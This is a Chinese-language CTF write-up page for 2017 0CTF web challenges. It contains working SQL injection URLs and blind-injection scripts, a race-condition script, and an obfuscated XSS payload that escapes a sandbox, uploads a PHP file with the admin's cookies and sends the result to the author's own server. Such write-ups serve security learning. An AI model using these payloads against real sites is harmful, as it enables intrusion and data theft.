@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.26" />
+
+<link rel="canonical" href="http://caijiji.github.io/2017/03/20/2017-0ctf-web-writeup/">
+<base href="http://caijiji.github.io/" />
+<meta property="og:title" content="2017-0CTF-web writeup" />
+<meta property="og:description" content="2017-0ctf-Web Writeup
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://caijiji.github.io/2017/03/20/2017-0ctf-web-writeup/" />
+
+
+
+<meta property="article:published_time" content="2017-03-20T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2017-03-20T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="2017-0CTF-web writeup"/>
+<meta name="twitter:description" content="2017-0ctf-Web Writeup
+
+"/>
+
+
+
+<meta itemprop="name" content="2017-0CTF-web writeup">
+<meta itemprop="description" content="2017-0ctf-Web Writeup
+
+">
+
+
+<meta itemprop="dateModified" content="2017-03-20T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="388">
+
+
+
+<meta itemprop="keywords" content="web," />
+
+
+<link rel="stylesheet" href="css/layout.css" />
+<link rel="stylesheet" href="css/color-dark.css" />
+
+
+
+<title>
+
+
+     2017-0CTF-web writeup 
+
+</title>
+
+<script src="js/highlight.min.js"></script>
+<link rel="stylesheet" href="css/tomorrow-night.min.css" />
+<script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+
+<body>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="http://caijiji.github.io/">菜狗小陈</a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
+    
+    <a class="nav-item" href="/friend/"><div class="nav-item-title">Friend</div></a>
+    
+    <a class="nav-item" href="https://Github.com/Caijiji"><div class="nav-item-title">GitHub</div></a>
+    
+    <a class="nav-item" href="https://twitter.com/Croxy_cn"><div class="nav-item-title">Twitter</div></a>
+    
+
+  </nav>
+</div>
+
+  
+<div class="social-links-header">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</div>
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> 2017-0CTF-web writeup </h1>
+    <div class="content"> <h1 id="2017-0ctf-web-writeup">2017-0ctf-Web Writeup</h1>
+
+<p></p>
+
+<h2 id="simplesqlin">simplesqlin</h2>
+
+<p>payload</p>
+
+<pre><code>
+http://202.120.7.203/index.php?id=4%20and%200%20uni%0con%20sel%0bect%201,flag,3%20fr%0bom%20flag
+</code></pre>
+
+<p>flag{W4f_bY_paSS_f0R_CI}</p>
+
+<h2 id="temmo-s-tiny-shop">Temmo&rsquo;s Tiny Shop</h2>
+
+<p>一开始只给了你4000块钱 然而HINT需要8000
+一个很明显的条件竞争
+写了个脚本解决了</p>
+
+<pre><code>import requests
+from concurrent import futures
+
+data = {'username':'cjj2','pwd':'cjj2'}
+
+headers1 = {'Cookies': 'PHPSESSID=s8ui2otf7k98a6p6ie4tqeoc22'}
+headers2 = {'Cookies': 'PHPSESSID=s8ui2otf7k98a6p6ie4tqeoc23'}
+
+
+s=requests.Session()
+s1=requests.Session()
+
+b = s.post('http://202.120.7.197/app.php?action=login',data=data,headers=headers1)
+c = s1.post('http://202.120.7.197/app.php?action=login',data=data,headers=headers2)
+d = s.get('http://202.120.7.197/app.php?action=buy&amp;id=1',headers=headers1)
+
+def sell1():
+    a = s.get(&quot;http://202.120.7.197/app.php?action=sale&amp;id=1&quot;,headers=headers1).content
+    print(a)
+def sell2():
+    a = s1.get(&quot;http://202.120.7.197/app.php?action=sale&amp;id=1&quot;,headers=headers2).content
+    print(a)
+
+ex = futures.ThreadPoolExecutor(max_workers=2)
+ex.submit(sell1)
+ex.submit(sell2)
+</code></pre>
+
+<p>然后购买HINT 得到</p>
+
+<pre><code>OK! Now I will give some hint: you can get flag by use `select flag from ce63e444b0d049e9c899c9a0336b3c59`
+</code></pre>
+
+<p>很明显提示这是个注入</p>
+
+<p>根据后台的功能能测试出order by 那里存在着注入
+我们可以通过order by if(1,name,price)来控制排序 实现布尔型盲注</p>
+
+<p>脚本</p>
+
+<pre><code>import requests
+import string
+
+headers = {'Cookie':'PHPSESSID=s7ui2otf7k98a6p6ie4tqeoc25'}
+
+def sqli():
+    payload = &quot;flag{&quot;
+    strings = string.letters+string.digits+'_'+'}'
+    k = 6
+    for i in range(1, 100):
+        flag = 0
+        j = 0
+        while not flag:
+            payloads = strings[j]
+            j = j + 1
+            url = &quot;http://202.120.7.197/app.php?action=search&amp;keyword=&amp;order=if((select(select(mid(flag,%s,1))from(ce63e444b0d049e9c899c9a0336b3c59))regexp(0x%s)),name,price)&quot; %(k,payloads.encode('hex'))
+            r = requests.get(url,headers=headers)
+            if r.text[44:45] == 'H':
+                flag = 1
+                payload = payload+payloads
+                print payload
+                k = k+1
+
+
+sqli()
+</code></pre>
+
+<p>flag{r4ce_c0nditi0n_i5_excited}</p>
+
+<h2 id="kog">KoG</h2>
+
+<p>看js代码发现我们带入id=1返回姓名
+而id=a则会返回Hello Hacker~
+抓包发现没有进行后端过滤
+猜测function.js动了手脚
+于是我们在</p>
+
+<pre><code>var ar = Module.main(value).split(&quot;|&quot;);
+</code></pre>
+
+<p>下个断点
+然后F11单步追踪
+如果中间遇到比较长的处理
+可以直接shift+F11跳出当前函数
+经过半个多小时的调试
+我们可以发现在</p>
+
+<pre><code>if ($13) {
+ ;HEAP32[$agg$result&gt;&gt;2]=HEAP32[$s&gt;&gt;2]|0;HEAP32[$agg$result+4&gt;&gt;2]=HEAP32[$s+4&gt;&gt;2]|0;HEAP32[$agg$result+8&gt;&gt;2]=HEAP32[$s+8&gt;&gt;2]|0;
+</code></pre>
+
+<p>这个判断后会跳到simpleReadValueFromPointer里
+<img src="http://7xicbb.com1.z0.glb.clouddn.com/xx.png" alt="" />
+而这里生成了我们的WrongBoy</p>
+
+<p>于是全局搜了一下
+发现代码有两处判断后执行的结果是一直的 都是</p>
+
+<pre><code> ;HEAP32[$agg$result&gt;&gt;2]=HEAP32[$s&gt;&gt;2]|0;HEAP32[$agg$result+4&gt;&gt;2]=HEAP32[$s+4&gt;&gt;2]|0;HEAP32[$agg$result+8&gt;&gt;2]=HEAP32[$s+8&gt;&gt;2]|0;
+  ;HEAP32[$s&gt;&gt;2]=0|0;HEAP32[$s+4&gt;&gt;2]=0|0;HEAP32[$s+8&gt;&gt;2]=0|0;
+  __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+  __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+  STACKTOP = sp;return;
+</code></pre>
+
+<p>也就是跳转到simpleReadValueFromPointer函数的地方
+所以我们可以改一下判断
+然后本地生成payload即可</p>
+
+<pre><code>http://202.120.7.213:11181/api.php?id=1%20union%20select%201,hey%20from%20fl4g&amp;hash=b2d6d2f6fa29ff2930d28c4989dd5553&amp;time=1489880690
+</code></pre>
+
+<p>flag{emScripten_is_Cut3_right?}</p>
+
+<h2 id="complicated-xss">complicated xss</h2>
+
+<p>提示说</p>
+
+<p>The flag is in <a href="http://admin.government.vip:8000">http://admin.government.vip:8000</a></p>
+
+<p>访问一下 得到一个登录框 登录进去发现</p>
+
+<p>提示
+Hello test</p>
+
+<p>Only admin can upload a shell</p>
+
+<p>然后发现cookie里面存在着test 而且没有任何过滤就输出出来了</p>
+
+<p>所以想到打xss让管理员登录 然后修改cookie 之后就会执行xss</p>
+
+<p>然后可以得到源码</p>
+
+<pre><code>&lt;head&gt;&lt;title&gt;Admin Panel&lt;/title&gt;&lt;script&gt;//sandboxdelete window.Function;delete window.eval;delete window.alert;delete window.XMLHttpRequest;delete window.Proxy;delete window.Image;delete window.postMessage;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Hello admin&lt;/h1&gt;&lt;p&gt;Upload your shell&lt;/p&gt;&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;p&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;
+</code></pre>
+
+<p>现在就想如何绕过沙盒
+在经过万能的<strong>鸡哥:sucer</strong>教育</p>
+
+<p>虽然沙盒禁用了那些函数 但是我们可以利用iframe建立一个新的contentwindow实体 就不会有这些沙盒的限制
+于是我们可以构造payload</p>
+
+<pre><code>&lt;script&gt;
+function injection()
+{
+var Days = 30;
+var exp = new Date();
+exp.setTime(exp.getTime() + Days*24*60*60*1000);
+var value = &quot;username&quot;+&quot;=&quot;+&quot;x&lt;iframe src=javascript:eval(String.fromCharCode(118,97,114,32,120,104,114,32,61,32,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,32,32,32,32,32,32,32,32,32,120,104,114,46,111,112,101,110,40,34,80,79,83,84,34,44,32,34,104,116,116,112,58,47,47,97,100,109,105,110,46,103,111,118,101,114,110,109,101,110,116,46,118,105,112,58,56,48,48,48,47,117,112,108,111,97,100,34,44,32,116,114,117,101,41,59,32,32,32,32,32,32,32,32,32,120,104,114,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,32,34,109,117,108,116,105,112,97,114,116,47,102,111,114,109,45,100,97,116,97,59,32,98,111,117,110,100,97,114,121,61,45,45,45,45,87,101,98,75,105,116,70,111,114,109,66,111,117,110,100,97,114,121,106,74,110,117,86,68,102,70,81,49,115,105,99,75,101,79,34,41,59,32,32,32,32,32,32,32,32,32,120,104,114,46,119,105,116,104,67,114,101,100,101,110,116,105,97,108,115,32,61,32,116,114,117,101,59,32,32,32,32,32,32,32,32,32,118,97,114,32,98,111,100,121,32,61,32,34,45,45,45,45,45,45,87,101,98,75,105,116,70,111,114,109,66,111,117,110,100,97,114,121,106,74,110,117,86,68,102,70,81,49,115,105,99,75,101,79,92,114,92,110,34,32,43,32,32,32,32,32,32,32,32,32,32,32,32,34,67,111,110,116,101,110,116,45,68,105,115,112,111,115,105,116,105,111,110,58,32,102,111,114,109,45,100,97,116,97,59,32,110,97,109,101,61,92,34,102,105,108,101,92,34,59,32,102,105,108,101,110,97,109,101,61,92,34,99,117,110,110,121,46,112,104,112,92,34,92,114,92,110,34,32,43,32,32,32,32,32,32,32,32,32,32,32,32,34,92,114,92,110,34,32,43,32,32,32,32,32,32,32,32,32,32,32,32,34,60,63,112,104,112,32,112,104,112,105,110,102,111,40,41,59,62,92,114,92,110,34,32,43,32,32,32,32,32,32,32,32,32,32,32,32,34,92,114,92,110,34,32,43,32,32,32,32,32,32,32,32,32,32,32,32,34,45,45,45,45,45,45,87,101,98,75,105,116,70,111,114,109,66,111,117,110,100,97,114,121,106,74,110,117,86,68,102,70,81,49,115,105,99,75,101,79,45,45,92,114,92,110,34,59,32,32,32,32,32,32,32,32,32,118,97,114,32,97,66,111,100,121,32,61,32,110,101,119,32,85,105,110,116,56,65,114,114,97,121,40,98,111,100,121,46,108,101,110,103,116,104,41,59,32,32,32,32,32,32,32,32,32,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,97,66,111,100,121,46,108,101,110,103,116,104,59,32,105,43,43,41,32,32,32,32,32,32,32,32,32,32,32,97,66,111,100,121,91,105,93,32,61,32,98,111,100,121,46,99,104,97,114,67,111,100,101,65,116,40,105,41,59,32,32,32,32,32,32,32,32,32,120,104,114,46,111,110,108,111,97,100,32,61,32,117,112,108,111,97,100,67,111,109,112,108,101,116,101,59,32,32,32,32,32,32,32,32,32,32,120,104,114,46,115,101,110,100,40,110,101,119,32,66,108,111,98,40,91,97,66,111,100,121,93,41,41,59,32,32,32,32,32,32,32,32,32,102,117,110,99,116,105,111,110,32,117,112,108,111,97,100,67,111,109,112,108,101,116,101,40,101,118,116,41,32,123,32,32,32,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,116,101,115,116,47,63,97,61,34,43,101,115,99,97,112,101,40,101,118,116,46,116,97,114,103,101,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,59,32,125))&gt;&lt;\/iframe&gt;&quot;+&quot;;expires=&quot;+exp.toGMTString()+&quot;;domain=&quot;+&quot;.government.vip;path=/&quot;;
+document.cookie = value;
+document.body.appendChild(document.createElement('iframe')).src=&quot;http://admin.government.vip:8000/&quot;;
+location.href =&quot;http://test/?&quot;+escape(window.top.frames[0].document.documentElement.innerHTML)
+}
+&lt;/script&gt;
+&lt;iframe src=&quot;http://test/xxoo.html&quot; onload=injection()&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p><a href="http://test/">http://test/</a> 是自己vps的ip
+char那段解码是</p>
+
+<pre><code>var xhr = new XMLHttpRequest();
+        xhr.open(&quot;POST&quot;, &quot;http://admin.government.vip:8000/upload&quot;, true);
+        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=----WebKitFormBoundaryjJnuVDfFQ1sicKeO&quot;);
+        xhr.withCredentials = true;
+        var body = &quot;------WebKitFormBoundaryjJnuVDfFQ1sicKeO\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;cunny.php\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;&lt;?php phpinfo();&gt;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;------WebKitFormBoundaryjJnuVDfFQ1sicKeO--\r\n&quot;;
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i &lt; aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.onload = uploadComplete; 
+        xhr.send(new Blob([aBody]));
+        function uploadComplete(evt) {
+  location.href=&quot;http://test/?a=&quot;+escape(evt.target.responseText);
+}
+</code></pre>
+
+<p>?a=flag%7Bxss_is_fun_2333333%7D</p>
+
+<h2 id="simplexss">simplexss</h2>
+
+<p>fuzz了一下发现符号基本全部都被过滤了</p>
+
+<p>但是！@\ &lt;还没有过滤</p>
+
+<p>如果只有&lt;没有&gt;的话 感觉很难执行js</p>
+
+<p>但是在咨询了万能的<strong>鸡哥:sucer</strong>教育</p>
+
+<pre><code>sucer  17:04:04
+你自己拿&lt;img src=\\xxx &lt; p&gt;玩一下就明白了
+&lt;img&gt;&lt;br&gt;&lt;hr&gt;&lt;link&gt;都是自闭合标签
+sucer  17:05:19
+&lt;area/&gt; &lt;base/&gt; &lt;input /&gt; &lt;!-- --&gt;
+</code></pre>
+
+<p>发现可以利用自闭标签 不用输入&gt;也能自己闭合</p>
+
+<p>那么在鸡哥的选项中 我们可以想到利用</p>
+
+<pre><code>&lt;link rel=import href=\\ /&gt;
+</code></pre>
+
+<p>来import我们的payload</p>
+
+<p>然而这题并没有做出来:(</p>
+
+<h3 id="写在最后">写在最后</h3>
+
+<p>自己也在边玩边做的做了两天0CTF，发现自己2015，2016,2017三年都做了0CTF，但是每一年都没有all solve0.0。
+  自己在2015 0CTF学到了变量覆盖host，然后利用中间人转发得到传输的数据，还有自己没接触过XXE的情况下自己摸索出XXE+后面injection的激动。
+  那晚也是通宵做了Alictf和0CTF两个比赛，不知道为什么那种感觉非常的好。
+  而在2016 0CTF我自己也想挑战看看，于是就尝试了自己做了一下 让自己收获最大的就是Monkey 通过修改DNS来达到跨域的目的
+  <a href="http://c-chicken.cc/2017/03/15/2016-03-15-0CTF-Web-Writeup/#more">http://c-chicken.cc/2017/03/15/2016-03-15-0CTF-Web-Writeup/#more</a>
+  这次ctf想的是跟着大家一起打，然而这个ctf对新人的确不友好，所以都没坚持下来:(
+  然后我发现自己一个人想问题的时候很容易陷入僵局。
+  比如在complicated xss我不去想绕过sandbox而是想着有没有新的姿势来上传文件，而且死认着这个方向。
+  而在simplexss 自己则死在&lt;script src=\ip\11 一直想着闭合script。
+  经过万能的鸡哥教育，发现自己思维陷入僵局的根本原因就在于知识不够，以后要好好跟着鸡哥学习前端。
+  感觉最近自己发现自己越来越多的不足，而且Dota也越来越差。
+  希望自己能像之前那样思维开阔一点:)</p> </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+    
+<div class="tags">
+    
+      <div class="tag">
+        <a href="/tags/web">#web</a>
+      </div>
+    
+</div>
+
+    <div class="date"> Mar 20, 2017 </div>
+  </div>
+
+</footer>
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'Croxy';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>
+  Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <div class="social-link">
+  <a href="http://caijiji.github.io/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright">  </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</body>
+</html>
+
